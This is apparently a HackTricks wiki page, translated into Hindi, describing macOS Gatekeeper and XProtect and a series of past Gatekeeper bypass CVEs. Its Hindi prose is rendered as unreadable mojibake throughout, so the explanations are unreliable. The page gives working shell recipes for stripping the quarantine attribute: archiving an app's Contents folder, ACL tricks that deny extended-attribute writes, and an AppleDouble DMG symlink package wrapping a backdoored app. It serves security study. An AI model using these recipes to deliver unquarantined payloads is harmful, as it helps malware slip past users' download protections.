* **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**: рдкреНрд▓рдЧрдЗрдиреНрд╕ рдФрд░ рдПрдХреНрд╕рдЯреЗрдВрд╢рдиреНрд╕ рдХреА рд╕реВрдЪреА рдЬрд┐рдиреНрд╣реЗрдВ BundleID рдФрд░ TeamID рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдпрд╛ рдиреНрдпреВрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдХрд╛ рд╕рдВрдХреЗрдд рджреЗрддреЗ рд╣реБрдП рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИред
* **`XProtect.bundle/Contents/Resources/XProtect.yara`**: рдореИрд▓рд╡реЗрдпрд░ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП Yara рдирд┐рдпрдоред
* **`XProtect.bundle/Contents/Resources/gk.db`**: рдЕрд╡рд░реБрджреНрдз рдПрдкреНрд▓рд┐рдХреЗрд╢рдиреНрд╕ рдФрд░ TeamIDs рдХреЗ рд╣реИрд╢реЗрд╕ рдХреЗ рд╕рд╛рде SQLite3 рдбреЗрдЯрд╛рдмреЗрд╕ред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **`/Library/Apple/System/Library/CoreServices/XProtect.app`** рдореЗрдВ рдПрдХ рдФрд░ рдРрдк рд╣реИ рдЬреЛ XProtect рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реИ рд▓реЗрдХрд┐рди Gatekeeper рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдирд╣реАрдВ рд╣реИред

### Not Gatekeeper

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ Gatekeeper **рд╣рд░ рдмрд╛рд░ рдирд╣реАрдВ рдЪрд▓рддрд╛** рдЬрдм рдЖрдк рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рдХреЗрд╡рд▓ _**AppleMobileFileIntegrity**_ (AMFI) рд╣реА **рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдХреЛрдб рд╕рд┐рдЧреНрдиреЗрдЪрд░реНрд╕ рдХреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░реЗрдЧрд╛** рдЬрдм рдЖрдк рдПрдХ рдРрд╕реЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдЬрд┐рд╕реЗ рдкрд╣рд▓реЗ рд╣реА Gatekeeper рджреНрд╡рд╛рд░рд╛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рдЪреБрдХрд╛ рд╣реИред
{% endhint %}

рдЗрд╕рд▓рд┐рдП, рдкрд╣рд▓реЗ рдпрд╣ рд╕рдВрднрд╡ рдерд╛ рдХрд┐ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ Gatekeeper рдХреЗ рд╕рд╛рде рдХреИрд╢ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдП, рдлрд┐рд░ **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреА рдиреЙрди-рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░реЗрдВ** (рдЬреИрд╕реЗ рдХрд┐ Electron asar рдпрд╛ NIB рдлрд╛рдЗрд▓реЗрдВ) рдФрд░ рдпрджрд┐ рдХреЛрдИ рдЕрдиреНрдп рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рдирд╣реАрдВ рдереЗ, рддреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди **рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рд╣реЛрддрд╛ рдерд╛ **рдореИрд▓рд┐рд╢рд╕** рдЬреЛрдбрд╝реЛрдВ рдХреЗ рд╕рд╛рдеред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЕрдм рдпрд╣ рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ macOS **рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдмрдВрдбрд▓реЛрдВ рдХреЗ рдЕрдВрджрд░ рдлрд╛рдЗрд▓реЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрддрд╛ рд╣реИ**ред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк [Dirty NIB](../macos-proces-abuse/macos-dirty-nib.md) рд╣рдорд▓реЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдкрд╛рдПрдВрдЧреЗ рдХрд┐ рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ рдЕрдм рд╕рдВрднрд╡ рдирд╣реАрдВ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ Gatekeeper рдХреЗ рд╕рд╛рде рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ рдХреИрд╢ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, рдЖрдк рдмрдВрдбрд▓ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдВрдЧреЗред рдФрд░ рдпрджрд┐ рдЖрдк рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП Contents рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХрд╛ рдирд╛рдо NotCon рдореЗрдВ рдмрджрд▓рддреЗ рд╣реИрдВ (рдЬреИрд╕рд╛ рдХрд┐ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдореЗрдВ рдЗрдВрдЧрд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ), рдФрд░ рдлрд┐рд░ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рдореБрдЦреНрдп рдмрд╛рдЗрдирд░реА рдХреЛ Gatekeeper рдХреЗ рд╕рд╛рде рдХреИрд╢ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ рдПрдХ рддреНрд░реБрдЯрд┐ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдЧрд╛ рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдирд╣реАрдВ рд╣реЛрдЧрд╛ред

## Gatekeeper Bypasses

Gatekeeper рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХрд╛ рдХреЛрдИ рднреА рддрд░реАрдХрд╛ (рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХреБрдЫ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рдирд╛ рдЬрдм Gatekeeper рдХреЛ рдЗрд╕реЗ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП) macOS рдореЗрдВ рдПрдХ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИред рдпреЗ рдХреБрдЫ CVE рд╣реИрдВ рдЬреЛ рдЕрддреАрдд рдореЗрдВ Gatekeeper рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреА рддрдХрдиреАрдХреЛрдВ рдХреЛ рд╕реМрдВрдкреЗ рдЧрдП рдереЗ:

### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

**Archive Utility** рджреНрд╡рд╛рд░рд╛ рдирд┐рдХрд╛рд▓реЗ рдЧрдП рдлрд╛рдЗрд▓реЛрдВ рдХреЗ **рдкрде рдЬреЛ 886** рд╡рд░реНрдгреЛрдВ рд╕реЗ рдЕрдзрд┐рдХ рд▓рдВрдмреЗ рд╣реЛрддреЗ рд╣реИрдВ, рд╡реЗ com.apple.quarantine рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдореЗрдВ рд╡рд┐рдлрд▓ рд╣реЛ рдЬрд╛рддреЗ рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ рдЙрди рдлрд╛рдЗрд▓реЛрдВ рдХреЗ рд▓рд┐рдП Gatekeeper рдХреЛ **рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ**ред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810) рджреЗрдЦреЗрдВред

### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

рдЬрдм рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди **Automator** рдХреЗ рд╕рд╛рде рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬрд░реВрд░реА рдЬрд╛рдирдХрд╛рд░реА `application.app/Contents/document.wflow` рдХреЗ рдЕрдВрджрд░ рд╣реЛрддреА рд╣реИ, рди рдХрд┐ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдореЗрдВред рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рд╕рд┐рд░реНрдл рдПрдХ рд╕рд╛рдорд╛рдиреНрдп Automator рдмрд╛рдЗрдирд░реА рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕реЗ **Automator Application Stub** рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЗрд╕рд▓рд┐рдП, рдЖрдк `application.app/Contents/MacOS/Automator\ Application\ Stub` рдХреЛ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдЕрдВрджрд░ рдПрдХ рдЕрдиреНрдп Automator Application Stub рдХреА рдУрд░ рдПрдХ рд╕рд┐рдореНрдмреЛрд▓рд┐рдХ рд▓рд┐рдВрдХ рдХреЗ рд╕рд╛рде **рдкреЙрдЗрдВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдпрд╣ `document.wflow` рдХреЗ рдЕрдВрджрд░ рдХреНрдпрд╛ рд╣реИ (рдЖрдкрдХреА рд╕реНрдХреНрд░рд┐рдкреНрдЯ) **рдмрд┐рдирд╛ Gatekeeper рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдП** рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рд╡рд╛рд╕реНрддрд╡рд┐рдХ рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓ рдореЗрдВ quarantine xattr рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред&#x20;

рдЙрдореНрдореАрдж рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╕реНрдерд╛рди рдХрд╛ рдЙрджрд╛рд╣рд░рдг: `/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ**](https://ronmasas.com/posts/bypass-macos-gatekeeper) рджреЗрдЦреЗрдВред

### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

рдЗрд╕ рдмрд╛рдпрдкрд╛рд╕ рдореЗрдВ рдПрдХ zip рдлрд╛рдЗрд▓ `application.app/Contents` рд╕реЗ рд╢реБрд░реВ рд╣реЛрдХрд░ рд╕рдВрдкреАрдбрд╝рд┐рдд рдХреА рдЧрдИ рдереА, рди рдХрд┐ `application.app` рд╕реЗред рдЗрд╕рд▓рд┐рдП, **quarantine attr** рд╕рднреА **рдлрд╛рдЗрд▓реЛрдВ рдкрд░ `application.app/Contents`** рдкрд░ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рд▓реЗрдХрд┐рди **`application.app` рдкрд░ рдирд╣реАрдВ**, рдЬрд┐рд╕реЗ Gatekeeper рдЬрд╛рдВрдЪ рд░рд╣рд╛ рдерд╛, рдЗрд╕рд▓рд┐рдП Gatekeeper рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдХреНрдпреЛрдВрдХрд┐ рдЬрдм `application.app` рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рддреЛ рдЙрд╕рдореЗрдВ **quarantine рд╡рд┐рд╢реЗрд╖рддрд╛ рдирд╣реАрдВ рдереАред**
```bash
zip -r test.app/Contents test.zip
```
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/) рджреЗрдЦреЗрдВред

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

рднрд▓реЗ рд╣реА рдШрдЯрдХ рдЕрд▓рдЧ рд╣реЛрдВ, рдЗрд╕ рднреЗрджреНрдпрддрд╛ рдХрд╛ рд╢реЛрд╖рдг рдкрд┐рдЫрд▓реЗ рдПрдХ рдХреЗ рд╕рдорд╛рди рд╣реА рд╣реИред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╣рдо **`application.app/Contents`** рд╕реЗ рдПрдХ Apple Archive рдмрдирд╛рдПрдВрдЧреЗ рддрд╛рдХрд┐ **`application.app`** рдХреЛ **Archive Utility** рджреНрд╡рд╛рд░рд╛ рдбрд┐рдХрдВрдкреНрд░реЗрд╕ рдХрд┐рдП рдЬрд╛рдиреЗ рдкрд░ quarantine attr рди рдорд┐рд▓реЗред
```bash
aa archive -d test.app/Contents -o test.app.aar
```
рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/) рджреЗрдЦреЗрдВред

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

ACL **`writeextattr`** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рд╕реА рдлрд╛рдЗрд▓ рдореЗрдВ рдПрдХ рд╡рд┐рд╢реЗрд╖рддрд╛ рд▓рд┐рдЦрдиреЗ рд╕реЗ рдХрд┐рд╕реА рдХреЛ рднреА рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, **AppleDouble** рдлрд╛рдЗрд▓ рдкреНрд░рд╛рд░реВрдк рдПрдХ рдлрд╛рдЗрд▓ рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдЙрд╕рдХреЗ ACEs рд╕рд╣рд┐рдд рдмрдирд╛рддрд╛ рд╣реИред

[**рд╕реЛрд░реНрд╕ рдХреЛрдб**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) рдореЗрдВ рдпрд╣ рджреЗрдЦрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ xattr **`com.apple.acl.text`** рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд ACL рдкрд╛рда рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡, рдбрд┐рдХрдореНрдкреНрд░реЗрд╕реНрдб рдлрд╛рдЗрд▓ рдореЗрдВ ACL рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдкрдиреЗ рдПрдХ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЛ **AppleDouble** рдлрд╛рдЗрд▓ рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдПрдХ zip рдлрд╛рдЗрд▓ рдореЗрдВ рд╕рдВрдкреАрдбрд╝рд┐рдд рдХрд┐рдпрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдПрдХ ACL рд╣реИ рдЬреЛ рдЕрдиреНрдп xattrs рдХреЛ рдЙрд╕ рдкрд░ рд▓рд┐рдЦрдиреЗ рд╕реЗ рд░реЛрдХрддрд╛ рд╣реИ... рддреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ quarantine xattr рд╕реЗрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛:

{% code overflow="wrap" %}
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
{% endcode %}

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [**рдореВрд▓ рд░рд┐рдкреЛрд░реНрдЯ**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) рджреЗрдЦреЗрдВред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг AppleArchives рдХреЗ рд╕рд╛рде рднреА рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```
### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

рдпрд╣ рдкрддрд╛ рдЪрд▓рд╛ рдХрд┐ **Google Chrome рдбрд╛рдЙрдирд▓реЛрдб рдХреА рдЧрдИ рдлрд╛рдЗрд▓реЛрдВ рдХреЛ quarantine attribute рд╕реЗрдЯ рдирд╣реАрдВ рдХрд░ рд░рд╣рд╛ рдерд╛** рдХреНрдпреЛрдВрдХрд┐ macOS рдХреА рдХреБрдЫ рдЖрдВрддрд░рд┐рдХ рд╕рдорд╕реНрдпрд╛рдУрдВ рдХреЗ рдХрд╛рд░рдгред

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

AppleDouble рдлрд╛рдЗрд▓ рдлреЙрд░реНрдореЗрдЯреНрд╕ рдПрдХ рдЕрд▓рдЧ рдлрд╛рдЗрд▓ рдореЗрдВ рдлрд╛рдЗрд▓ рдХреЗ рдЧреБрдгреЛрдВ рдХреЛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ `._` рд╕реЗ рд╢реБрд░реВ рд╣реЛрддреА рд╣реИ, рдпрд╣ **macOS рдорд╢реАрдиреЛрдВ рдХреЗ рдмреАрдЪ** рдлрд╛рдЗрд▓ рдЧреБрдгреЛрдВ рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрдирд╛рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдпрд╣ рджреЗрдЦрд╛ рдЧрдпрд╛ рдХрд┐ AppleDouble рдлрд╛рдЗрд▓ рдХреЛ рдбрд┐рдХрдВрдкреНрд░реЗрд╕ рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, `._` рд╕реЗ рд╢реБрд░реВ рд╣реЛрдиреЗ рд╡рд╛рд▓реА рдлрд╛рдЗрд▓ рдХреЛ quarantine attribute рдирд╣реАрдВ рджрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

{% code overflow="wrap" %}
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
```
{% endcode %}

рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рд╕реЗрдЯ рди рд╣реЛрдиреЗ рд╡рд╛рд▓реА рдлрд╛рдЗрд▓ рдмрдирд╛рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдиреЗ рд╕реЗ, **Gatekeeper рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛ред** рдЪрд╛рд▓ рдпрд╣ рдереА рдХрд┐ **AppleDouble рдирд╛рдо рд╕рдВрд╡рд┐рдзрд╛рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ DMG рдлрд╛рдЗрд▓ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдмрдирд╛рдПрдВ** (рдЗрд╕реЗ `._` рд╕реЗ рд╢реБрд░реВ рдХрд░реЗрдВ) рдФрд░ рдПрдХ **рджреГрд╢реНрдпрдорд╛рди рдлрд╛рдЗрд▓ рдХреЛ рдЗрд╕ рдЫрд┐рдкреА** рдлрд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП рд╕рд┐рдо рд▓рд┐рдВрдХ рдХреЗ рд░реВрдк рдореЗрдВ рдмрдирд╛рдПрдВ рдЬрд┐рд╕рдореЗрдВ рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рдирд╣реАрдВ рд╣реИред\
рдЬрдм **dmg рдлрд╛рдЗрд▓ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХреА рдЬрд╛рддреА рд╣реИ**, рдЪреВрдВрдХрд┐ рдЗрд╕рдореЗрдВ рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рдирд╣реАрдВ рд╣реЛрддрд╛, рдпрд╣ **Gatekeeper рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рджреЗрдЧреАред**
```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```
### рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди xattr рд░реЛрдХреЗрдВ

рдпрджрд┐ ".app" рдмрдВрдбрд▓ рдореЗрдВ рдХреНрд╡рд╛рд░рдВрдЯрд╛рдЗрди xattr рдЬреЛрдбрд╝рд╛ рдирд╣реАрдВ рдЧрдпрд╛ рд╣реИ, рддреЛ рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддреЗ рд╕рдордп **Gatekeeper рд╕рдХреНрд░рд┐рдп рдирд╣реАрдВ рд╣реЛрдЧрд╛**ред

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ**ред
* [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
